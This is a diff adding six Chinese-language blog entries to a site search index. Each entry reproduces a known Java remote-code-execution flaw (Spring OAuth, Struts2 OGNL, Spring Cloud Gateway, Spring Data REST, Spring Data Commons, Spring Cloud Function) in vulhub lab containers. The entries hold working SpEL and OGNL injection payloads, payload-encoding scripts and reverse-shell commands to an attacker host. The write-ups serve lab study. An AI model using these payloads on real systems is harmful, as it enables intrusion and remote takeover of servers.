@@ -390,4 +390,266 @@
         <tag>Nginx</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Spring Security OAuth 远程代码执行漏洞 CVE-2016-4977</title>
+    <url>/2026/02/04/CVE-2016-4977/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 1.0.0 - 1.0.5</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.0.0 - 2.0.9</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.0 - 2.0.14</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.1 - 2.1.1</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.2 - 2.2.1</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.3 - 2.3.2</font></li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>当授权请求中的 scope 参数不合法，Spring 会调用默认的 WhitelabelApprovalEndpoint 生成错误页面，Spring 视图解析器解析错误模板，将 ${errorSummary} 占位符替换成含用户输入的错误描述字符串，攻击者可以构造恶意 payload 带入到页面内容，Spring 渲染引擎未能识别用户输入数据，会将 ${} 包裹的内容再次交给 SpEL 解析器处理，敏感命令得以执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2016-4977</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2016-4977/1773371638149.png" alt="1773371638149"></p>
+<p>访问构造的 url，报错信息含构造计算式结果，说明存在注入点</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://公网ip:8080/oauth/authorize?response_type=${2*3}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2016-4977/1773371666253.png" alt="1773371666253"></p>
+<p>攻击脚本，python3</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">message = input('Enter message to encode:')</span><br><span class="line"></span><br><span class="line">poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line"></span><br><span class="line">   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += ')}'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在 python 脚本对话框输入反弹 shell 命令，bash -i /dev/tcp/ 攻击机 ip/监听端口 0&gt;&amp;1</p>
+<p><img src="/2026/02/04/CVE-2016-4977/1773371705353.png" alt="1773371705353"></p>
+<p>开启监听，nc -lvvp 监听端口</p>
+<p><img src="/2026/02/04/CVE-2016-4977/1773371847771.png" alt="1773371847771"></p>
+<p>注入 payload 到 url，并访问</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://公网ip:8080/oauth/authorize?response_type=脚本生成的payload&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2016-4977/1773371874911.png" alt="1773371874911"></p>
+<p>成功连接，虽然连接不稳定</p>
+<p><img src="/2026/02/04/CVE-2016-4977/1773371903717.png" alt="1773371903717"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 远程命令执行漏洞 CVE-2021-31805</title>
+    <url>/2026/02/04/CVE-2021-31805/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Struts 2.0.0 - 2.5.29</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Struts 内部对象虽然被锁死了，但是 Struts2 运行在 Tomcat 容器，攻击者可以利用 Tomcat 的 InstanceManager 绕过沙箱（相当于 CVE-2021-31805 是对 CVE-2020-17530 修复的绕过），InstanceManager 新建的 org.apache.commons.collections.BeanMap 对象能绕过普通权限检查，直接操作 memberAccess 的私有属性，利用 BeanMap 的 put 方法把 excludedClasses（Struts2 内部的黑名单）改为空，再通过攻击链执行敏感命令。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-061</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2021-31805/1773370476053.png"></p>
+<p>访问 http://公网: 8080，执行 OGNL 表达式 %{(11 + 11).toString()}，下面是对符号 url 编码的 payload，并打开 F12 查看属性，发现属性值出现了 OGNL 表达式计算的结果，说明存在注入点</p>
+<p><img src="/2026/02/04/CVE-2021-31805/1773370569956.png" alt="1773370569956"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#url编码特殊字符</span><br><span class="line">http://公网:8080?id=%25%7b+(11+%2b+11).toString()%7d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注入恶意 payload，可以将 id 替换成其他命令，通过 F12 查看回显</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27id%27}).(%23res%3d%23exec.exec(%23cmd))}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2021-31805/1773370598158.png" alt="1773370598158"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Cloud Gateway 远程代码执行漏洞 CVE-2022-22947</title>
+    <url>/2026/02/04/CVE-2022-22947/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Cloud Gateway 3.1.x - 3.1.1</li>
+<li>Spring Cloud Gateway 3.0.x - 3.0.7</li>
+<li>旧版本 / 停止维护版本</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入内存马（删除路由后还能驻留在内存中）</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring Cloud Gateway 提供了一个管理端点（/actuator/gateway/routes），允许管理员通过 HTTP 请求动态地添加、删除或修改路由配置，该端点暴露且未受保护，攻击者可以发送 POST 请求来定义新的路由，并在 filters 参数注入恶意代码，网关价值配置时候，会调用 ShortcutConfigurable 接口，该接口会将 filters 参数的值传给 SpEL 解析引擎。利用链分两个阶段，第一阶段为存储阶段，攻击者通过 T () 操作符调用 Java 环境敏感类来构造恶意代码，此时恶意代码仅仅作为字符串存在网关内存配置；第二阶段为触发阶段，加载过程网关会解析恶意表达式，解析成功后 Runtime.exec() 被调用，在服务器执行系统命令</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22947</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22947/1773373437627.png" alt="1773373437627"></p>
+<p>用 burosuite 抓取 http://公网: 8080 数据包</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373497270.png" alt="1773373497270"></p>
+<p>发送 Repeater 模块</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373535216.png" alt="1773373535216"></p>
+<p>修改请求方法为 POST，路径修改为/actuator/gateway/routes/自定义名称，内容类型改为 Content-Type: appliaction/json，请求主体注入有害 payload</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373619156.png" alt="1773373619156"></p>
+<p>返回 201</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373650371.png" alt="1773373650371"></p>
+<p>应用刚添加的路由发送以下数据包，触发敏感命令执行，修改路径为/actuator/gateway/refresh，修改内容格式：Content-Type: application/x-www-form-urlencoded，发送</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373682194.png" alt="1773373682194"></p>
+<p>返回 200</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373718780.png" alt="1773373718780"></p>
+<p>修改请求方法为 GET，路径改为/actuator/gateway/routes/自定义名称，发送</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373749244.png" alt="1773373749244"></p>
+<p>返回执行结果</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373777399.png" alt="1773373777399"></p>
+<p>删除添加的路由，修改请求头为 DELETE，发送</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373810115.png" alt="1773373810115"></p>
+<p>发送 200</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373835197.png" alt="1773373835197"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Data Rest 远程命令执行漏洞 CVE-2017-8046</title>
+    <url>/2026/02/08/CVE-2017-8046/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Data REST 2.5.0 - 2.5.11</li>
+<li>Spring Data REST 2.6.0 - 2.6.8</li>
+<li>Spring Data REST 3.0.0.RC1 - 3.0.0.RC3</li>
+<li>Spring Boot 1.5.0 - 1.5.8 </li>
+<li>Spring Boot 1.4.x 及更早版本</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring Data REST 支持通过 PATCH 请求对资源进行局部更新，PATCH 请求包含一个 path 字段，用于指定修改的对象属性，后端接受请求时，Spring 会将 path 字段直接传递给 SpeExpressionParser 解析，框架没用对 path 进行安全过滤或合法性检验，攻击者可以在 path 字段构造 SpEL 表达式实现代码执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2017-8046</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-8046/1773372181730.png" alt="1773372181730"></p>
+<p>攻击机开启监听端口，nc -lvvp 监听端口</p>
+<p><img src="/2026/02/08/CVE-2017-8046/1773372345886.png" alt="1773372345886"></p>
+<p>抓取 http://公网: 8080/customers/1 数据包</p>
+<p><img src="/2026/02/08/CVE-2017-8046/1773372291284.png" alt="1773372291284"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/08/CVE-2017-8046/1773372386658.png" alt="1773372386658"></p>
+<p>将反弹 shell 进行 base64 编码后构造出敏感命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>编码脚本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">def cmd_to_spel_ascii(command):</span><br><span class="line">    # 将命令转换为 ASCII 数字列表</span><br><span class="line">    ascii_values = [str(ord(c)) for c in command]</span><br><span class="line">    </span><br><span class="line">    # 用逗号分隔并打印</span><br><span class="line">    result = ",".join(ascii_values)</span><br><span class="line">    </span><br><span class="line">    print("\n[+] 原始命令: " + command)</span><br><span class="line">    print("[+] ASCII 序列 (逗号分隔):")</span><br><span class="line">    print(result)</span><br><span class="line">    </span><br><span class="line">    # 额外生成一个可以直接用于 SpEL 的 Payload 参考</span><br><span class="line">    # 逻辑：利用 new java.lang.String(new byte[]{...})</span><br><span class="line">    spel_payload = "new java.lang.String(new byte[]{" + result + "})"</span><br><span class="line">    print("\n[+] SpEL 字节数组参考:")</span><br><span class="line">    print(spel_payload)</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    target_cmd = input("请输入要转换的命令 (例如反弹 shell 指令): ")</span><br><span class="line">    cmd_to_spel_ascii(target_cmd)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用脚本对敏感命令进行 ascii 编码，构造注入的 payload，修改请求类型为，PATCH，添加 Content-Type: application/json-patch+json，请求主体为构造的 payload，这里用了反弹 shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{ascii编码的敏感命令}))/lastname", "value": "vulhub" }]</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-8046/1773372496576.png" alt="1773372496576"></p>
+<p>发送后返回 400</p>
+<p><img src="/2026/02/08/CVE-2017-8046/1773372535432.png" alt="1773372535432"></p>
+<p>成功连接，虽然连接不稳定</p>
+<p><img src="/2026/02/08/CVE-2017-8046/1773372597198.png" alt="1773372597198"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Data Commons 远程命令执行 CVE-2018-1273</title>
+    <url>/2026/02/08/CVE-2018-1273/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Data Commons 1.13 - 1.13.10</li>
+<li>Spring Data Commons 2.0 - 2.0.5</li>
+<li>Spring Boot 1.5.0 - 1.5.11</li>
+<li>Spring Boot 2.0.0 - 2.0.1</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring MVC 中，当用户通过 POST 表单提交数据，Spring Data 会尝试将请求参数绑定到后端 Java 对象或 Map 中，Spring Data 允许参数名通过方括号语法定位集合或 Map 中的元素（例如 tags [0] 或 users [‘admin’]），当 Spring Data 处理方括号 2 的参数名时候，会调用 MapDataBinder 进行解析，而系统直接调用 SpEL 引擎来解析方括号内容且不做过滤，攻击者可以通过参数名的方括号注入恶意 SpEL 代码实现命令执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2018-1273</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2018-1273/1773372745074.png" alt="1773372745074"></p>
+<p>使用 dirsearch 进行目录扫描</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">dirsearch -u http://公网:8080</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2018-1273/1773372808616.png" alt="1773372808616"></p>
+<p>访问 http://公网: 8080/users</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773372834224.png" alt="1773372834224"></p>
+<p>注册账号同时抓包</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773372888417.png" alt="1773372888417"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773372927639.png" alt="1773372927639"></p>
+<p>将输入请求主题内容替换为下面 payload，其中 touch /tmp/success 可以替换成其他敏感命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2018-1273/1773372980982.png" alt="1773372980982"></p>
+<p>发送后返回 500</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773373020167.png" alt="1773373020167"></p>
+<p>进入容器查看 /tmp 目录下的文件，发现 success，表示命令执行成功</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773373046364.png" alt="1773373046364"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Cloud Function 远程代码执行漏洞 CVE-2022-22963</title>
+    <url>/2026/02/04/CVE-2022-22963/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Cloud Function 3.0.0 - 3.1.6</li>
+<li>Spring Cloud Function 3.2.0 - 3.2.2</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p> SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring Cloud Function 引入 RoutingFunction 功能，允许开发者根据特定条件动态将请求分发给不同函数执行，框架允许通过 HTTP Header 来指定路由逻辑。当请求到达时，RoutingFunction 会检查是否存在特定 HTTP 请求头：spring.cloud.function.routing-expression，如果存在该 Header，框架会将其值作为 SpEL 表达式处理，攻击者可以构造恶意 payload 注入到 spring.cloud.function.routing-expression 属性值，服务器处理 POST 请求时候，识别到恶意 payload 就会触发解析，执行恶意命令。POST 请求主体不能为空，若为空，Spring 的 MessageConverter 可能不会触发后续参数绑定和路由解析流程</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22963</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22963/1773373961506.png" alt="1773373961506"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/uppercase 数据包</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773373999475.png" alt="1773373999475"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374028579.png" alt="1773374028579"></p>
+<p>修改请求类型为 POST，路径改为/functionRouter，将内容类型改为 Content-Type: text/plain，并在内容类型上一行注入恶意代码，创建 /tmp/success，还要在请求主体写入数据，这里填 test</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22963/1773374058562.png" alt="1773374058562"></p>
+<p>返回 500</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374098488.png" alt="1773374098488"></p>
+<p>进入容器查看文件夹 tmp，发现 success 文件，说明成功执行敏感命令</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374122900.png" alt="1773374122900"></p>
+<p>下面尝试进行反弹 shell，开启监听，nc -lvvp 7777</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374153226.png" alt="1773374153226"></p>
+<p>将下面命令替换到原 payload 的 touch /tmp/success</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22963/1773374183055.png" alt="1773374183055"></p>
+<p>连接成功，虽然不稳定</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374207523.png" alt="1773374207523"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
 </search>
